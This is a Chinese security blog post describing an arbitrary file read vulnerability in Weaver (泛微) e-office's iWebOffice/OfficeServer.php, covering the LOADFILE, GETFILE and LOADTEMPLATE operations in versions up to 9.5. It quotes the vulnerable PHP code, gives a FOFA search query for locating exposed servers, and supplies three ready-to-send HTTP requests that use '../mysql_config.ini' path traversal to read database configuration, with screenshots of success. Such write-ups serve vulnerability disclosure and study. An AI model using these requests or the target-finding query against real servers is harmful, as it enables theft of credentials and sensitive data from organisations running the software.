---
title: "泛微e-office OfficeServer.php 文件读取漏洞"
source: https://mrxn.net/jswz/eoffice-iWebOffice-OfficeServer-fileread.html
asset_dir: assets/泛微e-office-officeserver.php-文件读取漏洞
---

# 泛微e-office OfficeServer.php 文件读取漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/5/13 08:29
- 940浏览
- [0评论](#comment)
- 22分钟阅读

深入探索

应用程序

脚本语言

Office

---

# 漏洞简介

[泛微](https://mrxn.net/tag/泛微)E-Office是一款标准化的协同 OA 办公[软件](#)，泛微协同办公产品系列成员之一,实行通用化产品设计，充分贴合企业管理需求，本着简洁易用、高效智能的原则，为企业快速打造移动化、无纸化、数字化的办公平台。泛微e-office `iWebOffice/OfficeServer.php` 接口 `LOADFILE` 、`GETFILE` 和 `LOADTEMPLATE` 存在任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞，攻击者可以利用该[漏洞](https://mrxn.net/tag/漏洞)读取服务器上任意文件内容，造成敏感信息泄露。

商务软件和生产力软件

# 影响版本

e-office <=9.5

# fofa语法

> `app="泛微-EOffice"`

# 漏洞分析

## LOADFILE

```
case "LOADFILE" :
    $mFileName = $_REQUEST['FILENAME'];
    $mRecordID = $_REQUEST['RECORDID'];
    $mFullPath = $mFilePath."/".$mRecordID."/".$mFileName;
    $mFullPath = ( "utf-8", "gbk", $mFullPath );
    $result = ( $mFullPath );
    if ( $result == false )
    {
        $MsgError = $_lang['file_file_not_exist'].$mFullPath;
    }
    else
    {
        $fd = ( $mFullPath, "rb" );
        $mFileSize = ( $mFullPath );
        $mFileBody = ( $fd, ( $mFullPath ) );
        ( $fd );
        $MsgObj = $MsgObj."STATUS=".( $_lang['file_open_success']."!" )."\r\n";
    }
    break;
```

深入探索

Docker加速服务

SQL注入防护

安全工具开发

因 `FILENAME` 和 `RECORDID` 参数用户可控且无任何过滤或校验，导致可以拼接任意文件路径进行文件操作。

漏洞修复方案

## GETFILE

```
case "GETFILE" :
    $mRecordID = $RECORDID;
    $mLocalFile = $LOCALFILE;
    $mRemoteFile = $REMOTEFILE;
    $mFilePath = $mFilePath."/".$mRemoteFile;
    $MsgObj->MsgTextClear( );
    if ( $MsgObj->MsgFileLoad( $mFilePath ) )
```

## LOADTEMPLATE

```
case "LOADTEMPLATE" :
    $mTemplate = $TEMPLATE;
    $mFileType = $FILETYPE;
    $mCommand = $COMMAND;
    if ( $mCommand == "INSERTFILE" )
    {
        $MsgObj->MsgTextClear( );
        $result = $MsgObj->MsgFileLoad( $mFilePath."/".$mTemplate );
        if ( !$result )
        {
            $MsgObj->MsgError( "File not exists ".$mFilePath."/".$mTemplate );
        }
        else
        {
            $MsgObj->SetMsgByName( "STATUS", $_lang['file_open_success']."!" );
        }
    }
```

# 漏洞复现

## LOADFILE

```
GET /iWebOffice/OfficeServer.php?OPTION=LOADFILE&FILENAME=../mysql_config.ini HTTP/1.1
Host: eoffice.mrxn.net:8082
```

成功读取到 `mysql_config.ini` 文件数据库配置信息

物流软件安全

[![泛微e-office OfficeServer.php 文件读取漏洞](images/img-001-27ac105df8c6.webp)](https://image.mrxn.net/533b8ad7d3684c9385ff0264b81ff2b1.webp)

## GETFILE

```
GET /iWebOffice/OfficeServer.php?OPTION=GETFILE&REMOTEFILE=../mysql_config.ini HTTP/1.1
Host: eoffice.mrxn.net:8082
```

成功读取到 `mysql_config.ini` 文件数据库配置信息

商务软件和生产力软件

[![泛微e-office OfficeServer.php 文件读取漏洞](images/img-002-518729a120ed.webp)](https://image.mrxn.net/759ed15e022b4822967163a4458f3dee.webp)

## LOADTEMPLATE

```
GET /iWebOffice/OfficeServer.php?OPTION=LOADTEMPLATE&COMMAND=INSERTFILE&TEMPLATE=../mysql_config.ini HTTP/1.1
Host: eoffice.mrxn.net:8082
```

成功读取到 `mysql_config.ini` 文件数据库配置信息

漏洞修复方案

[![泛微e-office OfficeServer.php 文件读取漏洞](images/img-003-70ada3fa6903.webp)](https://image.mrxn.net/c824b85a36b34288930a51e826eb1188.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)
- [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [4.1.LOADFILE](#toc-4-1-)
- [4.2.GETFILE](#toc-4-2-)
- [4.3.LOADTEMPLATE](#toc-4-3-)
- [5.漏洞复现](#toc-5-)
- [5.1.LOADFILE](#toc-5-1-)
- [5.2.GETFILE](#toc-5-2-)
- [5.3.LOADTEMPLATE](#toc-5-3-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
